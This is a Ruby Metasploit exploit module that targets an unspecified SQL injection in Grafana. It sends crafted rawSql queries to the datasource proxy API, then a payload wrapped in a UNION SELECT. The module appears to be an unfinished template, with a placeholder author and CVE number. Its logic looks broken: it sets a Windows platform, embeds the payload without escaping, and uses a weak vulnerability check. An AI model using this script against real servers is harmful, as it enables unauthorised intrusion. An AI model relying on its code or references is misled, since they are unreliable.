# modules/exploits/grafana/grafana_sql_injection.rb
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Grafana SQL Injection',
      'Description'    => %q{
        This module exploits a SQL injection vulnerability in Grafana.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Your Name', # Module author
        ],
      'References'     =>
        [
          ['CVE', '2024-XXXX'],
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows', {}],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Apr 22 2024',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to Grafana', '/']),
        Opt::RPORT(3000)
      ])
  end

  def check
    res = send_request_cgi({
      'uri'    => normalize_uri(target_uri.path, 'api', 'datasources', 'proxy', '1', 'query'),
      'method' => 'POST',
      'headers' => { 'Content-Type' => 'application/json' },
      'data'   => '{"rawSql":"SELECT 1"}'
    })

    if res && res.code == 200 && res.body.include?('1')
      return Exploit::CheckCode::Appears
    end
    Exploit::CheckCode::Safe
  end

  def exploit
    payload_sql = "UNION SELECT #{payload.encoded}--"

    send_request_cgi({
      'uri'    => normalize_uri(target_uri.path, 'api', 'datasources', 'proxy', '1', 'query'),
      'method' => 'POST',
      'headers' => { 'Content-Type' => 'application/json' },
      'data'   => "{\"rawSql\":\"#{payload_sql}\"}"
    })
  end
end
